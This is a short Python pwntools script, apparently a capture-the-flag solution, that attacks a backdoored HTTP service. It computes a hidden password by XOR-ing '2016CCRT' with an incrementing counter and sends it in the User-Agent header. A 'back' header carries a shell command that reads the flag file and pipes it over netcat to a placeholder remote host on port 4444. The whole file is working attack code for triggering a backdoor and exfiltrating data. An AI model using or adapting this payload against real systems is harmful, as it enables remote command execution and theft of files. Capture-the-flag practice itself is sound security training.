from pwn import *

sh = remote('127.0.0.1', 1807)
# sh = remote('pwn.jarvisoj.com', 9881)

key = '2016CCRT'

password = ''
num = 0
for x in key:
	password += chr(ord(x) ^ num)
	num += 1
print "password: " + password

command = 'cat flag | nc xxx.xxx.xxx.xxx 4444'

payload = ""
payload += "GET / HTTP/1.1\r\n"
payload += "User-Agent: %s\r\n" % (password)
payload += "back: %s\r\n" % (command)
payload += "\r\n"
payload += "\r\n"
print "payload: " + payload

sh.sendline(payload)
sh.recv()
sh.close()
